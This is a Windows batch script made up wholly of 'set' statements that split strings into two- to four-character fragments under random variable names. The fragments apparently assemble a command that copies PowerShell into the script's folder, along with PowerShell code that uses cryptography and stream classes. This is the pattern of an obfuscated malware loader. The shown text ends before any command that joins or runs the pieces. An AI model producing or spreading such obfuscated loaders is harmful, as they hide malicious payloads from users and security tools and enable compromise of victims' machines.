@echo off
set "AxrgNIhyok=.e"
set "xjdVZnlDJi=py"
set "GmSRxoKbnK=we"
set "pZNbQgYMFy=ll"
set "TphLlBVVpE=in"
set "zLMknYflft= /"
set "BuvOhgIefN=po"
set "hHEsudmZpd=\W"
set "QBcJszdZhb=Sy"
set "laJkxXeTOl=1."
set "JzZYAFEcYm=s\"
set "ckQOPkHMtP=ow"
set "vFnZIxMpUm=st"
set "YODalGIWMn=y "
set "gqZXAcMbhR=ll"
set "dadzVQFVcq=he"
set "iIMwVSAZLF= C"
set "jAuvxDkCuU=co"
set "BGVYKHDpbn=Po"
set "FAFuJuhnAv=xe"
set "WLamOBihwp=32"
set "ICdKxJbYXc=Wi"
set "QIiYdmXYSw=he"
set "pESEftKnNq=ws"
set "nFjCjANYzF=nd"
set "ulNvlfGPAC=we"
set "fnBrCjEMEL=:\"
set "xlPjNowCFR=rS"
set "rLiQDhmRIL=0\"
set "JJZdSpRMlw=\v"
set "YTnWAXBizL=rs"
set "bpFhtNGlcE=em"
set "SSXDeKFakg=do"
set "kZxFKPIujP=cd"
set "cJzYnCCNhj= %~dp0"
set "jCeqpyQzrn=ntFX"
set "xiDMjhYcyU=ose("
set "yCQDiAaWxt=V = "
set "EpJzHesazH=$JZh"
set "gRYImWlTnb=YxVw"
set "dqitSZQfxW=trea"
set "khjHjXMBtM=Secu"
set "OlUxklZCjU=d;$n"
set "hNwqgicDRk=rt]:"
set "DuAZbAkfbU=.Sec"
set "kRxstvoQQh=Wce "
set "njMjNnijxE=6] -"
set "ojskkfYouJ=lit("
set "kOCJqLCeEr=ewLi"
set "wUwRaXEtYP=Stre"
set "jZXQWvtBRg=ptog"
